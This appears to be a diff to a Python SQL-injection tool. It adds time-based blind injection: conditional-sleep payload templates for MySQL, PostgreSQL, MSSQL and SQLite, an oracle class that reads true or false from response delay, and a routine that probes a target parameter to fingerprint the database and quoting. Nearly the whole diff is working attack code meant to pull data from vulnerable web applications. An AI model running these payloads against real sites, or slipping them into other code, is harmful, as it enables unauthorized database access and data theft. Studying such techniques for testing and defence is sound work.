@@ -13,6 +13,7 @@ from __future__ import annotations
 import difflib
 import html as _html
 import re
+import time
 from urllib.parse import parse_qs, urlencode, urlsplit, urlunsplit
 
 # Injection contexts: how to wrap an arbitrary boolean condition C around the
@@ -140,6 +141,63 @@ def calibrate(http, url, param, value, console=None):
             o = Oracle(http, url, param, value, tmpl, context, t, f, console)
             if o.ask("1=1") and not o.ask("1=2"):   # confirm the oracle is consistent
                 return o
+    return None
+
+
+# --- time-based blind: the universal fallback (works when nothing leaks) ----
+# Conditional sleep per DBMS — sleeps {n}s only when ({c}) is true.
+_SLEEP = {
+    "mysql":    "{v}{q} AND IF(({c}),SLEEP({n}),0){cm}",
+    "postgres": "{v}{q} AND 1=(CASE WHEN ({c}) THEN (SELECT 1 FROM pg_sleep({n})) ELSE 1 END){cm}",
+    "mssql":    "{v}{q};IF(({c})) WAITFOR DELAY '0:0:{n}'{cm}",
+    "sqlite":   "{v}{q} AND (CASE WHEN ({c}) THEN sleep({n}) ELSE 0 END)=0{cm}",  # lab only
+}
+
+
+class TimeOracle:
+    """A yes/no question answered by the response *time*: a true condition sleeps."""
+
+    def __init__(self, http, url, param, value, dbms, quote, n, threshold, console=None):
+        self.http, self.url, self.param, self.value = http, url, param, value
+        self.dbms, self.quote, self.n, self.threshold = dbms, quote, n, threshold
+        self.context = f"{dbms}/time"
+        self.console = console
+        self.template = _SLEEP[dbms]
+
+    @property
+    def count(self):
+        return self.http.count
+
+    def ask(self, condition: str) -> bool:
+        payload = self.template.format(v=self.value, q=self.quote, c=condition, n=self.n, cm=_COMMENT)
+        if self.console is not None and self.console.verbose >= 2:
+            self.console.trace(f"{self.param}={payload}", level=2)
+        t0 = time.monotonic()
+        _inject(self.http, self.url, self.param, payload)
+        return (time.monotonic() - t0) >= self.threshold
+
+
+def time_calibrate(http, url, param, value, n=2, console=None):
+    """Find a DBMS+context whose conditional sleep visibly delays the response."""
+    samples = []
+    for _ in range(3):
+        t0 = time.monotonic()
+        _inject(http, url, param, value)
+        samples.append(time.monotonic() - t0)
+    base, jitter = min(samples), max(samples) - min(samples)
+    if jitter > n * 0.5:                      # too noisy to time reliably
+        return None
+    threshold = base + n * 0.6
+    for dbms, tmpl in _SLEEP.items():
+        for q in ("", "'", '"'):
+            t0 = time.monotonic()
+            _inject(http, url, param, tmpl.format(v=value, q=q, c="1=1", n=n, cm=_COMMENT))
+            if (time.monotonic() - t0) < threshold:
+                continue                      # true didn't delay -> wrong dbms/context
+            t0 = time.monotonic()             # confirm a false condition stays fast
+            _inject(http, url, param, tmpl.format(v=value, q=q, c="1=2", n=n, cm=_COMMENT))
+            if (time.monotonic() - t0) < threshold:
+                return TimeOracle(http, url, param, value, dbms, q, n, threshold, console)
     return None
 
 
